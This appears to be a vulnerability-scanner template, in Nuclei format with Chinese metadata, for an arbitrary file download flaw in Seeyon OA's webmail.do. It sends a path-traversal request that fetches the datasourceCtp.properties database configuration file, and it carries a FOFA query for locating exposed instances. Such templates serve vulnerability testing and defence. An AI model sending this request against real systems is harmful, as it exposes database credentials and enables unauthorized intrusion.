script_name: 致远OA webmail.do 任意文件下载
content:
id: Seeyon-OA-webmail-File-download

info:
  name: Seeyon OA  File download
  author: cr
  severity: high
  description: Seeyon-OA-File-download
  tags: Seeyon,webmail.do,File,download

requests:
  - method: GET
    path:
      - '{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "ctpDataSource"
        part: body

      - type: status
        status:
          - 200
#fofa-query:app="致远互联-OA"
help: 致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
author: cr
online_script_name: 致远OA webmail.do 任意文件下载
